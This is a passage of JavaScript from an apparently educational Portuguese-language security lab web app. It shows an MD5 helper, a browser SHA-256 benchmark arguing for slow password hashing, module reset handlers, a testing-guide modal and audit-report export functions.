        b = md5ii(b, c, d, a, words[i + 9], 21, -343485551);

        a = safeAdd(a, olda);
        b = safeAdd(b, oldb);
        c = safeAdd(c, oldc);
        d = safeAdd(d, oldd);
      }

      function rhex(n) {
        let s = '', j;
        for (j = 0; j <= 3; j++) {
          s += ((n >> (j * 8 + 4)) & 0x0F).toString(16) + ((n >> (j * 8)) & 0x0F).toString(16);
        }
        return s;
      }
      return (rhex(a) + rhex(b) + rhex(c) + rhex(d)).toLowerCase();
    }

    async runBenchmark() {
      if (!this.benchResult) return;
      this.benchResult.innerHTML = '<i class="fas fa-spinner fa-spin text-cyan"></i> Processando 10.000 iterações SHA-256 via Web Crypto API...';

      const iterations = 10000;
      const sampleText = 'benchmarking_cybersec_pass_2026';
      const enc = new TextEncoder();
      const encoded = enc.encode(sampleText);

      const t0 = performance.now();

      // Executa 10k hashes em batches de 500 para não travar a UI
      const batchSize = 500;
      const batches = iterations / batchSize;

      for (let b = 0; b < batches; b++) {
        const promises = [];
        for (let i = 0; i < batchSize; i++) {
          promises.push(window.crypto.subtle.digest('SHA-256', encoded));
        }
        await Promise.all(promises);
      }

      const totalTimeMs = performance.now() - t0;
      const hashesPerSec = Math.round((iterations / totalTimeMs) * 1000);

      this.benchResult.innerHTML = `
        <div style="line-height: 1.6;">
          <span class="text-emerald font-mono"><strong>BENCHMARK FINALIZADO:</strong></span> ${iterations.toLocaleString()} iterações SHA-256 concluídas em <strong>${totalTimeMs.toFixed(1)}ms</strong>.<br>
          Taxa do Navegador Local: <strong class="text-cyan font-mono">~${hashesPerSec.toLocaleString()} hashes/segundo</strong>.<br>
          <span style="font-size: 0.72rem; color: var(--text-secondary);">
            Em contraste, uma GPU moderna (RTX 4090) atinge ~5.000.000.000 hashes SHA-256/seg, provando a necessidade de funções iterativas lentas como Bcrypt.
          </span>
        </div>
      `;

      logger.log('CRYPTO', 'M5: Hash', `Benchmark concluído: ${iterations} iterações em ${totalTimeMs.toFixed(1)}ms (~${hashesPerSec.toLocaleString()} h/s).`);
    }

    reset() {
      if (this.input) this.input.value = 'senha123';
      this.currentSalt1 = this.generateRandomHex(16);
      this.currentSalt2 = this.generateRandomHex(16);
      this.updateAllHashes();
      if (this.benchResult) {
        this.benchResult.textContent = 'Clique no botão acima para iniciar o benchmark de taxa de hash do navegador.';
      }
      logger.log('INFO', 'M5: Hash', 'Parâmetros de hashing e salts redefinidos para os padrões.');
    }
  }

  const hashModule = new HashModule();

  /* ==========================================================================
     8. RESET GLOBAL DE CENÁRIOS & MODAL DE AUDITORIA FORENSE
     ========================================================================== */
  function resetCurrentModule() {
    const current = tabManager.activeTab;
    if (current === 'sqli') sqliModule.reset();
    else if (current === 'xss') xssModule.reset();
    else if (current === 'tls') tlsModule.reset();
    else if (current === 'jwt') jwtModule.reset();
    else if (current === 'hash') hashModule.reset();
  }

  const globalResetBtn = document.getElementById('btn-global-reset');
  if (globalResetBtn) {
    globalResetBtn.addEventListener('click', () => {
      resetCurrentModule();
    });
  }

  // Modal de Auditoria
  const auditModal = document.getElementById('export-modal');
  const btnCloseModal = document.getElementById('btn-close-modal');
  const globalExportBtn = document.getElementById('btn-global-export');
  const previewJsonArea = document.getElementById('report-preview-json');
  const btnDownloadTxt = document.getElementById('btn-download-txt');
  const btnDownloadJson = document.getElementById('btn-download-json');

  function openAuditModal() {
    if (!auditModal) return;

    const reportObj = {
      project: 'CyberSec Lab — Laboratório de Segurança da Informação & Criptografia',
      lead: 'Sandro Junior Hoffmann de Oliveira (@sanjrhoff)',
      timestamp: new Date().toISOString(),
      telemetry: {
        total_events: logger.logs.length,
        exploits_tested: logger.counts.EXPLOIT,
        defenses_active: logger.counts.BLOCKED,
        crypto_operations: logger.counts.CRYPTO,
        warnings: logger.counts.WARN
      },
      audit_logs: logger.logs
    };

    if (previewJsonArea) {
      previewJsonArea.value = JSON.stringify(reportObj, null, 2);
    }

    auditModal.classList.add('is-open');
  }

  function closeAuditModal() {
    if (auditModal) auditModal.classList.remove('is-open');
  }

  if (globalExportBtn) globalExportBtn.addEventListener('click', openAuditModal);
  if (btnCloseModal) btnCloseModal.addEventListener('click', closeAuditModal);
  if (auditModal) {
    auditModal.addEventListener('click', (e) => {
      if (e.target === auditModal) closeAuditModal();
    });
  }

  // ==========================================================================
  // GUIA PRÁTICO DA BANCADA: "COMO TESTAR?"
  // ==========================================================================
  const guideModal = document.getElementById('guide-modal');
  const btnGlobalGuide = document.getElementById('btn-global-guide');
  const btnCloseGuideModal = document.getElementById('btn-close-guide-modal');
  const btnGuideCloseBottom = document.getElementById('btn-guide-close-bottom');

  function openGuideModal(targetTab) {
    if (!guideModal) return;
    const tabToOpen = targetTab || tabManager.activeTab || 'sqli';
    switchGuideModalTab(tabToOpen);
    guideModal.classList.add('is-open');
    logger.log('INFO', 'GUIDE', `Guia de Testes aberto no módulo [${tabToOpen.toUpperCase()}].`);
  }

  function closeGuideModal() {
    if (guideModal) guideModal.classList.remove('is-open');
  }

  function toggleGuideModal() {
    if (guideModal && guideModal.classList.contains('is-open')) {
      closeGuideModal();
    } else {
      openGuideModal();
    }
  }

  function switchGuideModalTab(tabId) {
    const validTabs = ['sqli', 'xss', 'tls', 'jwt', 'hash'];
    if (!validTabs.includes(tabId)) tabId = 'sqli';

    document.querySelectorAll('.guide-modal-tab-btn').forEach(btn => {
      const active = btn.getAttribute('data-guide-tab') === tabId;
      btn.classList.toggle('is-active', active);
    });

    document.querySelectorAll('.guide-module-section').forEach(sec => {
      const active = sec.getAttribute('data-guide-section') === tabId;
      sec.classList.toggle('is-active', active);
    });
  }

  if (btnGlobalGuide) {
    btnGlobalGuide.addEventListener('click', () => openGuideModal());
  }

  if (btnCloseGuideModal) {
    btnCloseGuideModal.addEventListener('click', closeGuideModal);
  }

  if (btnGuideCloseBottom) {
    btnGuideCloseBottom.addEventListener('click', closeGuideModal);
  }

  if (guideModal) {
    guideModal.addEventListener('click', (e) => {
      if (e.target === guideModal) closeGuideModal();
    });
  }

  // Abas dentro do modal de guia
  document.querySelectorAll('.guide-modal-tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const tabId = btn.getAttribute('data-guide-tab');
      switchGuideModalTab(tabId);
    });
  });

  // Botões de "Ver Guia Completo" espalhados pelos módulos
  document.querySelectorAll('.open-guide-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const target = btn.getAttribute('data-target-tab') || tabManager.activeTab;
      openGuideModal(target);
    });
  });

  // Botão "Ir para este Módulo" dentro do modal
  document.querySelectorAll('.guide-jump-module-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const target = btn.getAttribute('data-jump');
      if (target) {
        tabManager.switchTab(target);
        closeGuideModal();
      }
    });
  });

  function downloadFile(content, fileName, contentType) {
    const a = document.createElement('a');
    const file = new Blob([content], { type: contentType });
    a.href = URL.createObjectURL(file);
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      document.body.removeChild(a);
      window.URL.revokeObjectURL(a.href);
    }, 100);
  }

  if (btnDownloadJson) {
    btnDownloadJson.addEventListener('click', () => {
      const content = previewJsonArea ? previewJsonArea.value : '';
      const dateStr = new Date().toISOString().replace(/[:.]/g, '-');
      downloadFile(content, `cybersec-audit-report-${dateStr}.json`, 'application/json');
      logger.log('INFO', 'AUDIT', 'Relatório JSON de auditoria exportado com sucesso.');
    });
  }

  if (btnDownloadTxt) {
    btnDownloadTxt.addEventListener('click', () => {
      const dateStr = new Date().toISOString().replace(/[:.]/g, '-');
      let txtContent = `================================================================================\n`;
      txtContent += `CYBERSEC LAB — RELATÓRIO FORENSE DE AUDITORIA & SEGURANÇA\n`;
      txtContent += `Lead do Projeto: Sandro Junior Hoffmann de Oliveira (@sanjrhoff)\n`;
      txtContent += `Gerado em: ${new Date().toISOString()}\n`;
      txtContent += `================================================================================\n\n`;
      txtContent += `RESUMO DE TELEMETRIA:\n`;
      txtContent += `• Total de Eventos Registrados: ${logger.logs.length}\n`;
      txtContent += `• Exploits Executados: ${logger.counts.EXPLOIT}\n`;
      txtContent += `• Defesas Ativas / Bloqueios: ${logger.counts.BLOCKED}\n`;
      txtContent += `• Operações Criptográficas: ${logger.counts.CRYPTO}\n\n`;
      txtContent += `HISTÓRICO COMPLETO DE LOGS SIEM:\n`;
      txtContent += `--------------------------------------------------------------------------------\n`;

      logger.logs.forEach(l => {
        txtContent += `[${l.timestamp}] [${l.type.padEnd(7)}] [${l.module.padEnd(10)}] ${l.message}\n`;
      });

      downloadFile(txtContent, `cybersec-audit-report-${dateStr}.txt`, 'text/plain');
      logger.log('INFO', 'AUDIT', 'Relatório TXT de auditoria exportado com sucesso.');
    });
  }

  // Inicialização Concluída
  logger.log('INFO', 'BOOT', 'CyberSec Lab inicializado com sucesso. Web Crypto API ativa.');
})();
